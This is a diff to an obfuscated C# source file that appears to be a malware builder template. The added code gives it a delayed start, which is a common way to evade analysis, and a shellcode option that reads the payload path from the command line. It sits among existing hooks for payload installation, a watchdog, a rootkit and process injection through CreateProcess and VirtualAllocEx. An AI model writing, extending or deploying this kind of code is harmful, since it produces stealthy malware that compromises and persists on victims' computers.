@@ -39,13 +39,20 @@ public partial class _rProgram_
 #endif
             }
 #endif
+#if DefStartDelay
+            Thread.Sleep(startDelay * 1000);
+#endif
             string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
             string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));
 #if DefInstall
             try
             {
-                string _rplp_ = PayloadPath;
+                string _rplp_ = PayloadPath;    
+#if DefShellcode
+                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
+#else
                 string _rcmdl_ = Application.ExecutablePath;
+#endif
                 if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                 {
 #if DefRootkit
@@ -402,15 +409,15 @@ public partial class _rProgram_
 
     [DllImport("kernel32.dll")]
     private static extern bool CreateProcess(string _rarg1_,
-                                                 string _rarg2_,
-                                                 IntPtr _rarg3_,
-                                                 IntPtr _rarg4_,
-                                                 bool _rarg5_,
-                                                 uint _rarg6_,
-                                                 IntPtr _rarg7_,
-                                                 string _rarg8_,
-                                                 byte[] _rarg9_,
-                                                 byte[] _rarg1_0);
+                                             string _rarg2_,
+                                             IntPtr _rarg3_,
+                                             IntPtr _rarg4_,
+                                             bool _rarg5_,
+                                             uint _rarg6_,
+                                             IntPtr _rarg7_,
+                                             string _rarg8_,
+                                             byte[] _rarg9_,
+                                             byte[] _rarg1_0);
 
     [DllImport("kernel32.dll")]
     private static extern long VirtualAllocEx(long _rarg1_,
